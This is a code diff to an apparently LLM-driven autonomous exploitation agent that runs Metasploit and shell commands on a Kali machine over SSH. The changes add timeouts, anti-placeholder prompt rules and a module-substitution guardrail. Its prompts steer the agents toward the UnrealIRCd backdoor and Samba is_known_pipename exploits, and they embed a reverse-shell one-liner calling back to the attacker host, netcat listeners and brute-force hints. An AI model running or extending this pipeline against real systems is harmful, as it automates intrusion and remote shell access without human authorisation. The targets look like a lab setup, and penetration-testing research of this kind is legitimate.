@@ -9,6 +9,7 @@ import sys
 import json
 import re
 import time
+import socket
 import operator
 from typing import TypedDict, Annotated, List, Literal
 
@@ -74,18 +75,38 @@ def print_colored(text: str, color: str):
 # SSH UTILITIES
 # =============================================================================
 
+SSH_COMMAND_TIMEOUT = 90  # seconds — bound the channel so long-running/blocking
+# commands (e.g. a hydra brute force) can never hang the read loop indefinitely.
+
 def run_ssh_command(command: str) -> str:
-    """Execute command on remote Kali machine via SSH."""
+    """Execute command on remote Kali machine via SSH.
+
+    The channel itself is bounded by SSH_COMMAND_TIMEOUT so a blocking or
+    long-running remote process (e.g. hydra) cannot hang the readline loop
+    forever — paramiko's readline only returns on EOF, which arrives when the
+    remote process exits. On timeout we close the connection and return a
+    failure string so the executor can react instead of stalling the stage.
+    """
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
         ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
-        stdin, stdout, stderr = ssh.exec_command(command)
+        stdin, stdout, stderr = ssh.exec_command(command, timeout=SSH_COMMAND_TIMEOUT)
 
         output_lines = []
-        for line in iter(stdout.readline, ""):
-            output_lines.append(line)
+        try:
+            for line in iter(stdout.readline, ""):
+                output_lines.append(line)
+        except socket.timeout:
+            partial = "".join(output_lines).strip()
+            return (
+                f"Command '{command}' TIMED OUT after {SSH_COMMAND_TIMEOUT}s and was "
+                f"abandoned. It is likely interactive or long-running (e.g. a brute "
+                f"force) — this stage requires non-blocking commands.\n"
+                f"REACTION REQUIRED: do NOT retry the same command; switch to a "
+                f"different technique/module.\nPartial output:\n{partial}"
+            )
 
         err_output = stderr.read().decode()
         exit_status = stdout.channel.recv_exit_status()
@@ -242,6 +263,7 @@ prefer those over RAG-sourced or general-knowledge exploits unless they've alrea
 4. Specify the MITRE ATT&CK technique ID
 5. If retrying after failure, MUST choose a DIFFERENT approach
 6. SCOPE: Exploitation only — no recon/scanning
+6b. **MISSED-PORT / PROVEN-EXPLOIT OVERRIDE**: When the researcher's summary mentions a well-known service (e.g., IRC/UnrealIRCd on port 6667) that is NOT in target_info.ports but has HIGH-CONFIDENCE past-success evidence (a successful_attacks log for this exploit/IP), you MAY select it with approach="msf" and note the port explicitly in PART 1. Do NOT discard proven exploits just because the port was missed in recon's top-100 scan — a service can be open even if Nmap's default scan did not list it.
 7. **CHOOSE APPROACH** — select "msf" (Metasploit module) or "manual" (Linux terminal commands):
    - Use "msf" when a compatible MSF module exists that supports the user's needs
    - Use "manual" when the user wants a payload type no MSF module supports, or when MSF has already failed and a manual approach is more promising
@@ -313,6 +335,8 @@ Generate the EXACT sequence of Metasploit commands to configure and run the expl
 5. If retrying after critic feedback, READ the feedback and adjust the specific parameter that was wrong
 6. FOLLOW THE ATTACK PLAN — if the plan specifies a payload type (e.g., "Python reverse shell"), set the matching payload (e.g., 'set payload cmd/unix/reverse_python')
 7. **CRITICAL: LHOST and LPORT are PAYLOAD options, not exploit options — you MUST select a payload first before setting them.**
+8. **CRITICAL — NO PLACEHOLDERS**: Every value you write MUST be a real, concrete value — never use angle-bracket placeholders (<username>, <path>, <port>), pseudo-code, or inline comments (e.g. "# Assuming...") inside command arguments. If you do not know the exact value, use a reasonable default (e.g., username=vagrant, password list=/usr/share/wordlists/john.lst, TARGETURI=/). Commands are executed EXACTLY as written.
+9. **CRITICAL — USE THE GIVEN MODULE**: The TOOL CANDIDATE JSON is your ONLY choice of module. You MUST use the exact module path from tool_candidate["module"] in your `use <module>` command. Do NOT substitute a different module. If you believe the module is wrong, still output the command sequence for the GIVEN module — the critic will handle routing.
 
 Output the command sequence as a numbered list, one command per line:
 1. use <module>
@@ -334,6 +358,8 @@ Examples of manual attack patterns:
 - Python reverse shell trigger via vulnerable service: `echo 'AB; python -c "import socket,subprocess,os;s=socket.socket(...);s.connect((\"{KALI_IP}\",4444));..." | nc <target_ip> <port>`
 - Curl-based RCE: `curl http://<target_ip>:<port>/vulnerable_endpoint -d 'payload=...'`
 - Crafted payloads via bash, perl, python, ruby
+
+**CRITICAL — NO PLACEHOLDERS (manual mode too)**: Every value MUST be concrete — never use angle-bracket placeholders (<username>, <path>, <target_ip>, <port>), pseudo-code, or inline comments inside command arguments. Substitute the real target IP from target_info, real wordlist paths (e.g. /usr/share/wordlists/john.lst), and real usernames (e.g. vagrant). Commands are executed EXACTLY as written.
 
 Output the command sequence as a numbered list, one command per line. Each command should use tool_linux_terminal.
 """
@@ -367,11 +393,13 @@ You have access to the Metasploit console and a Linux terminal. Execute the atta
     Module/environment errors (e.g., "directory not writable", "Exploit aborted") cannot be fixed by
     switching payloads — report the failure and let the critic route to a different exploit
 12. General best practice: after `use <module>`, run `show payloads` EARLY to discover compatible payloads
+12b. **REFUSE PLACEHOLDER COMMANDS**: If a command from the parameter solver contains angle-bracket placeholders (<username>, <path>, <port>, etc.) or an inline `#` comment as part of an argument, STOP — do NOT execute it. Provide a text assessment stating the command was a placeholder and request a concrete command; the critic will re-route to the parameter solver.
 
 **Manual Attack Rules:**
 13. Do NOT install packages (no apt-get, no pip, no gem). Use only tools already available on Kali.
 14. If the attack plan specifies a MANUAL approach (not MSF), use `tool_linux_terminal` for all commands instead of `tool_metasploit_rpc`.
 15. For listener setup in manual mode, use backgrounded commands (e.g., `nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &`) to avoid blocking the terminal.
+16. **SAMBA is_known_pipename**: For exploit/linux/samba/is_known_pipename the ONLY compatible payload is cmd/unix/interact. This is a BIND module — it connects FROM the target. Start a netcat listener on Kali FIRST via tool_linux_terminal: `nohup nc -lvnp 4444 > /tmp/samba_shell.txt 2>&1 &`. Then set RHOST to the target IP and RPORT to 445 (NOT 4444). Do NOT set LHOST or LPORT — they are not valid for this module. The session appears as "Command shell session opened".
 
 **Success indicators:** "Command shell session X opened", "Meterpreter session X opened"
 **Failure indicators:** "Exploit completed, but no session", "Connection refused", "Unknown command"
@@ -398,7 +426,13 @@ You receive the execution_result, session detection flag, and recent tool output
 
 4. **FAIL_CONTEXT** — The message history is bloated and the agent is clearly confused or looping.
 
-5. **FAIL_EXHAUSTED** — No session was opened AND the error is genuinely unfixable after exhausting all reasonable alternatives (target down, port closed, service confirmed not vulnerable, all viable modules tried). This is the giving-up verdict — it is a FAILURE, not a success. Use this instead of PASS when there is no session and nothing more to try.
+5. **FAIL_EXHAUSTED** — No session was opened AND the error is genuinely unfixable after exhausting all reasonable alternatives. This is the giving-up verdict — it is a FAILURE, not a success. Use this instead of PASS when there is no session and nothing more to try.
+   FAIL_EXHAUSTED requires ALL of:
+     (a) at least 2 DISTINCT exploit families or techniques were tried (not the same one twice),
+     (b) every attempt resulted in a NON-TRANSIENT failure — NOT a tool error, missing-wordlist/path error, timeout, or network error that a different tool would avoid (a single hydra run with a missing wordlist path is NOT exhausted), AND
+     (c) the researcher has explicitly stated no other viable approach exists.
+   **CONCRETE-NEXT-ACTION RULE**: Use FAIL_EXHAUSTED ONLY when the NEXT_ACTION you would write is "nothing" or "investigate externally". If you have ANY concrete NEXT_ACTION (e.g., "try UnrealIRCd on port 6667", "try Samba is_known_pipename"), you MUST return FAIL_EXPLOIT instead so the researcher can route to that alternative. FAIL_EXHAUSTED means: no viable path remains.
+   When only one technique was attempted and it failed due to a tooling/config/network error, return FAIL_EXPLOIT, not FAIL_EXHAUSTED.
 
 **Output format (ALL fields required):**
 
@@ -576,6 +610,7 @@ Rules:
 - If the exploit ABORTED (e.g., "directory not writable", config error) → this is a MODULE-level failure, switching payloads will NOT help. Tell the user to STOP and report failure.
 - If the exploit completed but no session was created (and did NOT abort) → the payload didn't connect back, suggest a different payload type
 - If a handler failed to bind → the port is already in use, suggest changing LPORT
+- If the module is exploit/linux/samba/is_known_pipename (or any module whose ONLY compatible payload is cmd/unix/interact) → this is a BIND-shell module that connects FROM the target. Do NOT set LHOST/LPORT (invalid here) and do NOT set RPORT to 4444. Set RHOST to the target IP and RPORT to 445, start a netcat listener on Kali FIRST (nohup nc -lvnp 4444 > /tmp/samba_shell.txt 2>&1 &), then run.
 - For any other error, give your best contextual advice based on the output
 
 Output ONLY: [SYSTEM HINT: <your one-sentence advice>]"""
@@ -896,6 +931,14 @@ def researcher_node(state: AgentState) -> dict:
             context += f"   Notes: {candidate['notes']}\n"
         context += "\nThese are deterministic matches based on exact service versions. Prioritize these over RAG results.\n\n"
 
+    context += (
+        "NOTE: IRC/UnrealIRCd commonly runs on port 6667 (and is frequently MISSED "
+        "by an Nmap top-100 default scan, so it may be absent from target_info.ports). "
+        "If successful attack logs mention this service on this IP, treat it as a "
+        "viable target and surface exploit/unix/irc/unreal_ircd_3281_backdoor (port "
+        "6667) as a top candidate in your summary even though the port is not listed.\n\n"
+    )
+
     context += f"You have made {researcher_tool_count} knowledge base queries so far."
 
     # Include any critic feedback if retrying
@@ -1037,6 +1080,44 @@ def parameter_solver_node(state: AgentState) -> dict:
 
     commands = response.content
     print_colored(f"[Parameter Solver] Commands:\n{commands[:300]}...", Colors.OKGREEN)
+
+    # --- GUARDRAIL: ensure the solver used the planner-selected module ---
+    # The solver sometimes hallucinates a DIFFERENT (often already-banned) module
+    # in its `use <module>` line. If the generated module differs from the
+    # tool_candidate module AND that substituted module has already failed,
+    # re-prompt with an explicit override forcing the correct module.
+    if approach != "manual":
+        intended = (tool_candidate.get("module") or "").strip()
+        used_match = re.search(r'\buse\s+(\S+)', commands)
+        used_module = used_match.group(1).strip() if used_match else ""
+        failed_modules = _extract_failed_exploits(messages)
+        substituted_banned = bool(
+            intended and used_module
+            and used_module.lower() != intended.lower()
+            and any(
+                b.lower() in used_module.lower() or used_module.lower() in b.lower()
+                for b in failed_modules
+            )
+        )
+        if substituted_banned:
+            print_colored(
+                f"[Parameter Solver] GUARDRAIL: solver substituted banned module "
+                f"'{used_module}' instead of '{intended}' — re-prompting.",
+                Colors.WARNING,
+            )
+            override = (
+                f"CRITICAL OVERRIDE: You output `use {used_module}`, but that module "
+                f"has ALREADY FAILED and is BANNED. You MUST use the planner-selected "
+                f"module EXACTLY: {intended}. Re-issue the full command sequence "
+                f"beginning with `use {intended}`. Do NOT substitute any other module.\n\n"
+                + context
+            )
+            response = call_llm(
+                messages=[HumanMessage(content=override)],
+                system_prompt=PARAMETER_SOLVER_PROMPT,
+            )
+            commands = response.content
+            print_colored(f"[Parameter Solver] Re-issued commands:\n{commands[:300]}...", Colors.OKGREEN)
 
     return {
         "messages": [AIMessage(content=f"[Parameter Solver] Command sequence:\n{commands}")]
@@ -1494,7 +1575,7 @@ def _extract_findings(state: dict) -> ExploitationFindings:
     if success and session_id:
         alive = False
         try:
-            probe = str(msf_session.run_session_command(session_id, "echo __alive__"))
+            probe = str(msf_session.run_session_command(session_id, "echo __alive__", timeout=5))
             if "__alive__" in probe:
                 alive = True
             else:
@@ -1504,6 +1585,31 @@ def _extract_findings(state: dict) -> ExploitationFindings:
                     alive = bool(stype)
                 except Exception:
                     alive = False
+            # --- DOUBLE-PROBE for fragile command_shell sessions ---
+            # command shells from backdoor modules (e.g. unreal_ircd_3281_backdoor)
+            # frequently pass an immediate probe but die seconds later under load.
+            # Require a SECOND probe ~2s later to succeed before declaring success.
+            # Meterpreter sessions are stable, so a single probe suffices for them.
+            if alive and session_type == "command_shell":
+                try:
+                    time.sleep(2)
+                    probe2 = str(
+                        msf_session.run_session_command(session_id, "id", timeout=5)
+                    )
+                    if not probe2.strip():
+                        alive = False
+                        print_colored(
+                            f"[Liveness Check] session {session_id} (command_shell) "
+                            f"failed second probe — treating as dying.",
+                            Colors.WARNING,
+                        )
+                except Exception:
+                    alive = False
+                    print_colored(
+                        f"[Liveness Check] session {session_id} (command_shell) "
+                        f"second probe raised — treating as dying.",
+                        Colors.WARNING,
+                    )
         except Exception as e:
             print_colored(
                 f"[Liveness Check] session {session_id} probe failed: {e}",
@@ -1572,7 +1678,7 @@ def _extract_findings(state: dict) -> ExploitationFindings:
         # console context — returning the attacker identity, not the target's.
         try:
             id_out = str(
-                msf_session.run_session_command(session_id, "id")
+                msf_session.run_session_command(session_id, "id", timeout=5)
             ).strip().lower()
             print_colored(f"[Access Check] id on session {session_id}: {id_out}", Colors.OKCYAN)
             if "root" in id_out or "uid=0" in id_out:
@@ -1610,7 +1716,7 @@ def _extract_findings(state: dict) -> ExploitationFindings:
     # it can never block the return of findings.
     if success and session_id and not session_user_info:
         try:
-            id_out = str(msf_session.run_session_command(session_id, "id"))
+            id_out = str(msf_session.run_session_command(session_id, "id", timeout=5))
             m = re.search(r'uid=(\d+)\((\w+)\)', id_out)
             if m:
                 session_user_info = {
